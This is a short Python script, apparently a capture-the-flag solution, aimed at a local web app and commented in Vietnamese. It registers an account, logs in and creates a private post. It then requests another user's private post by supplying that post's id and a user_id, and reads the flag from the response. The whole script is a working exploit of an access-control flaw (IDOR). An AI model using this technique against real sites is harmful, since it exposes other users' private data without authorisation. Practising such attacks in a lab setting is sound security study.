#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# from bs4 import BeautifulSoup

url = 'http://127.0.0.1:24004'

session = requests.Session()
# đăng ký tài khoản
data = {
    'username': 'cuong',
    'password': 123
}

response = session.post(
    url + '/index.php?action=register',
    data=data,
    verify=False,
)

print(response.text) # verify

# đăng nhập tài khoản
response = session.post(
    url + '/index.php?action=login',
    data=data,
    verify=False
)

print(response.text) # verify

# đăng bài viết ở dạng riêng tư -> public = 0
data_content = {
    'content': 'cuong',
    'public': 0
}

response = session.post(
    url + '/post.php?action=create',
    data=data_content,
    verify=False,
)

print(response.text) # verify

# hiển thị bài đăng có id  của crush
response = session.get(
    url + '/post.php?action=read&id=a7381cbd118b5699a69c576c7a2205ef&user_id=2',
    verify=False,
)

print(response.text) # hiển thị response có flag

